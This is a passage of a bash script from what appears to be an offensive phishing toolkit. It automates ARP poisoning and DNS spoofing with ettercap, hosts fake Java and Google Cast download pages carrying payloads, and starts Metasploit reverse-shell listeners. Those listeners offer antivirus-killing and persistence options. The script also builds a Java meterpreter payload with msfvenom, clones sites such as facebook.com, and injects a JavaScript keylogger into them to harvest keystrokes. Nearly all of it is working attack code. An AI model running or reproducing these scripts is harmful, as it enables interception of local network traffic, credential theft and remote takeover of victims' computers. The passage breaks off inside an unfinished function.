      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    # clean everything up
    /etc/init.d/apache2 stop
    rm -r $tWd > /dev/null 2>&1
    rm $apache/$name > /dev/null 2>&1
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/jv0h.jpg > /dev/null 2>&1
    rm $apache/softdown.png > /dev/null 2>&1
    rm $apache/metrics_group1.js > /dev/null 2>&1
    rm $apache/jv0_search_btn.gif > /dev/null 2>&1
    rm $apache/popUp.js > /dev/null 2>&1
    rm $apache/print.css > /dev/null 2>&1
    rm $apache/s_code_remote.js > /dev/null 2>&1
    rm $apache/screen.css > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}









sh_P0stEALL () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default Listenner" FALSE "Post-auto.rc" --width 350 --height 205) > /dev/null 2>&1


   if [ "$pass" = "Default Listenner" ]; then
     # starting a metasploit listenner
     echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
     sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


       elif [ "$pass" = "Post-auto.rc" ]; then
       # starting a metasploit listenner (post-auto.rc)
       echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
       echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
       sleep 2
       xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     clear

fi
cd $H0m3/opensource
clear
}













#
# google cast missing extension
#
sh_gooext () {
Colors;

 # remove old payload from cache
 rm -r $tWd > /dev/null 2>&1

      # get user input
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      fthost=$(zenity --title "HOST A FILE" --text "Chose the file to be hosted in apache webserver" --filename=$H0m3/opensource/priv8 --file-selection) > /dev/null 2>&1
      name=$(zenity --title="Name your payload" --text "virus.exe" --entry --width 350) > /dev/null 2>&1
      lhost=$(zenity --title="Input LHOST of [ $name ]" --text "\nexample: $IP\n" --entry --width 350) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT of [ $name ]" --text "\nexample: 4444\n" --entry --width 350) > /dev/null 2>&1

         # CHOSE WHAT PAYLOAD TO USE
         payload=$(zenity --list --title "PAYLOAD USED BY [ $name ]" --text "\nchose the correspondent payload\nused by the hosted file:$name\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1


clear
cat << !

     [SETTING ARP POISON ATTACK]:
     ----------------------------
     leave blank to poison all local network
     (This will affect all devices inside local lan)

     or chose the modem/router ip address (route -n)
     and the target ip address as well.

!

      echo ${BlueF}[*]${RedF}:${BlueF}[setting ARP poison]: ${Reset};
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # download googlecast.tag.gz from repository
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Downloading]${RedF}:${GreenF}[ googlecast.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/googlecast.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: googlecast.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf googlecast.tar.gz
         echo ""

         # replace strings in index.html using SED command
         sed "s/Payl04D/$name/g" index.html > copy.html
         mv copy.html index.html
         rm -f copy.html

           # copy files to apache webroot directory
           cp index.html $apache/index.html
           cp -r Google_Cast_extension $apache/Google_Cast_extension
           cp $fthost $apache/$name
           cd $apache
           chown $user $name
           chown $user Google_Cast_extension
           chmod +x $name

clear
cat << !

     [Host a file] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $apache/$name
     PAYLOAD          : $payload

!

         # pre-load phishing webpage
         su $user xdg-open "index.html" > /dev/null 2>&1
         QuE=$(zenity --question --title "PRE-LOADING PHISHING WEBPAGE" --text "does the webpage displays correct?\nclose pre-load webpage and chose to continue or return to main menu" --width 350) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
         echo "good" > /dev/null 2>&1
         else
         echo ${BlueF}[*]${RedF}:${BlueF}[return to main menu]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 2 && sh_exit # return to main menu
         fi


      sleep 2
      # start apache webserver + arp poison + metasploit listenner
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


       if [ "$payload" "=" "windows/meterpreter/reverse_tcp" ]; then
         # jump to windows post-exloitation module
         sh_p0st4


           elif [ "$payload" "=" "windows/meterpreter/reverse_http" ]; then
           # jump to post-exloitation module
           sh_p0st4


           elif [ "$payload" "=" "windows/meterpreter/reverse_https" ]; then
           # jump to post-exloitation module
           sh_p0st4

       else

         # if not windows than lunch post-exploitation
         # for unix systems (post-auto.rc)
         sh_P0stEALL4
fi
}


sh_p0st4 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
       xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         # persistence listenner
         sh_perlis5


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/$name > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/Google_Cast_extension > /dev/null 2>&1
    rm $apache/index.html > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}




sh_P0stEALL4 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default Listenner" FALSE "Post-auto.rc" --width 350 --height 205) > /dev/null 2>&1


   if [ "$pass" = "Default Listenner" ]; then
     # starting a metasploit listenner
     echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


       elif [ "$pass" = "Post-auto.rc" ]; then
       # starting a metasploit listenner (post-auto.rc)
       echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
       echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
       sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/Google_Cast_extension > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     rm $apache/$name > /dev/null 2>&1
     sleep 2
     clear

fi
cd $H0m3/opensource
clear
}





# ----------------------->







# build resource file with latest listenner settings
sh_rcfile () {
Colors;
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

          echo "use exploit/multi/handler" > $resource-handler.rc
          echo "set PAYLOAD $payload" >> $resource-handler.rc
          echo "set LPORT $lport" >> $resource-handler.rc
          echo "set LHOST $lhost" >> $resource-handler.rc
          echo "set ExitOnSession false" >> $resource-handler.rc
          echo "exploit -j -z" >> $resource-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user $resource-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
clear
}














# ----------------------------------
# clone a website and inject a metasploit iframe (java_keylogger)
# ----------------------------------
sh_cloneph () {
Colors;

      # input attackers variables
      echo ${BlueF}[*]${RedF}:${YellowF}[Clonning WebSite target]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      target=$(zenity --title="CLONE WEBSITE [ url OR domain ]" --text "example: www.facebook.com" --entry --width 500) > /dev/null 2>&1
      uripath=$(zenity --title="Input URIPATH" --text "example: keylogger" --entry --width 300) > /dev/null 2>&1
      echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
      read victim


         # clean up script
         if [ -d $tWd/$target ]; then
         rm -r $tWd/$target
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 2
         clear
         sh_cloneph

else


      Colors;
      # dowloading/clonning website target
      mkdir $tWd
      cd $tWd
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ cloning website ]${Reset};
      mkdir $target
      cd $target
      # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
      wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js $target | zenity --progress --pulsate --title "JAVA_KEYLOGGER" --text="Cloning $target" --percentage=0 --auto-close --width 300 > /dev/null 2>&1


# inject the javascript <TAG> in cloned index.html using SED command
sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$lhost:8080\/$uripath\/test.js'><\/script><\/body>/g" index.html > copy.html
mv copy.html index.html

# display current config settings to attacker
cat << !

     Payload [keylogger] Final Config:
     =================================
     LHOST            : $lhost
     LPORT            : 8080
     PAYLOAD          : auxiliary/server/capture/http_javascript_keylogger
     INJECTION        : <script type="text/javascript" src="http://$lhost:8080/$uripath/test.js"></script>
     STORAGE IN       : $apache/index.html
                      : $apache/$target
     LOOT FOLDER      : /opensource/logs
     AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris

!

         # copy all files to apache2 webroot
         echo ${BlueF}[*]${RedF}:${BlueF}[copy files]${RedF}:${GreenF}[ to apache2 webroot ]${Reset};
         sleep 2
         cp index.html $apache/index.html
         cd ..
         cp -r $target $apache/$target
         cd $apache/
         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 2

      # setting ARP poison attack
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      # start a listenner + ettercap mitm + dns_spoof
      xterm -T "r00tsect0r - Automated exploit: Dns-spoof-keylogger" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $lhost; URIPATH=$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_clear33

fi
}


sh_clear33 () {
      # stop apache2 webserver if is running
      /etc/init.d/apache2 stop

         # clean up script
         echo ${RedF}'_'${Reset};
         rm $apache/index.html
         if [ -d $apache/$target ]; then
         rm -r $apache/$target
         echo ${RedF}[x]:[WAIT]:[ deleting old target from apache2 webroot ]${Reset};
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x]:[WAIT]:[ deleting old files from: $tWd ]${Reset};
         sleep 1

            # exporting logs to opensource/logs folder
            if [ -d $H0m3/.msf4/loot ]; then
            cd $H0m3/.msf4/loot
            cp *.txt $H0m3/opensource/logs > /dev/null 2>&1
            rm *.txt > /dev/null 2>&1
            zenity --title="browser keystrocks storage" --text "$H0m3/opensource/logs/" --width 300 --info > /dev/null 2>&1
         cd $H0m3/opensource
      fi
   fi
fi
}













# ---------------------------
# build a java.jar payload
# ---------------------------
sh_javajar () {
Colors;
# chose to use download webpage or direct URL execution
choset=$(zenity --list --title "JAVA.JAR PHISHING" --text "deliver payload using:" --radiolist --column "Pick" --column "Option" TRUE "phishing download webpage" FALSE "Drive-by URL payload execution" --width 320 --height 160) > /dev/null 2>&1
  if [ "$choset" = "phishing download webpage" ]; then
    sh_dfdgt # jump to download phishing webpage
  elif [ "$choset" = "Drive-by URL payload execution" ]; then
    sh_dirurl # jump to direct URL execution
  else
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
  fi
}




sh_dfdgt () {
Colors;
pt=`echo ~`

         # clean up script
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 1
         sh_dfdgt

else

      # get user input to build the payload
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      fthost=$(zenity --title="NAME YOUR PAYLOAD" --text "\n example: java.jar\n" --entry --width 300) > /dev/null 2>&1
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # downloading file from network
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ java-exploit.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/java-exploit.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: java-exploit.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf java-exploit.tar.gz

         # replace strings in index.html using SED command
         cd java-exploit
         sed "s/Payl04D/$fthost/g" index-jar.html > index.html
         rm -f index-jar.html

            # building payload
            echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $fthost ]${Reset};
            xterm -T "r00tsect0r - building $fthost" -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 -f java > $H0m3/opensource/priv8/$fthost"

cat << !

     Payload [jar] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $fthost
     STORAGE IN       : $apache/$fthost
     EXEC             : phishing download webpage
     PAYLOAD          : java/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Apple OSx, windows, Linux, BSD, Solaris

!

            # copy files to apache webserver
            cp -r index_files $apache/index_files
            cp index.html $apache/index.html
            cp jv0h.jpg $apache/jv0h.jpg
            cp softdown.png $apache/softdown.png
            cp metrics_group1.js $apache/metrics_group1.js
            cp jv0_search_btn.gif $apache/jv0_search_btn.gif
            cp popUp.js $apache/popUp.js
            cp print.css $apache/print.css
            cp s_code_remote.js $apache/s_code_remote.js
            cp screen.css $apache/screen.css
            cd $H0m3/opensource/priv8
            chown $user $fthost
            cp $fthost $apache/$fthost
            cd $apache/
            chmod +x $fthost

               # start apache webserver
               xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
               echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
               sleep 2

         # redirect webdomains
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
         sh_jarpost
fi
}



sh_jarpost () {
Colors;

